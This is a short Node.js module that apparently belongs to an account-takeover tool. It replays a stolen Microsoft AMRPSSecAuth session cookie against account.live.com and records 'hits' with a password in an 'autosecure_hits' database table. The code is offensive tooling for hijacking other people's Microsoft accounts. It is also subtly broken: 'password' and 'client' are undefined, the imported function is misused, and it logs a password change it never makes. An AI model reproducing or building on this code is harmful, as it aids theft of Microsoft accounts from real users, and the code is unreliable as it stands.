const axios = require("axios");
const { queryParams } = require("../../../db/database");
module.exports = async (amrp, id) => {
 let data = await axios({
  method: "GET",
  url: "https://account.live.com/consent/Manage?guat=1",
  headers: {
   Cookie: `AMRPSSecAuth=${amrp};`,
  }
 });
 if (data?.data?.Vortex) {
  console.log(`Failed to change password ${data.data.Vortex}`)
 } else {
  if (id) {
   await client.queryParams(`UPDATE autosecure_hits SET password=? WHERE id=?`, [password, id])
  }
  console.log(`Changed password to ${password}`)
 }
}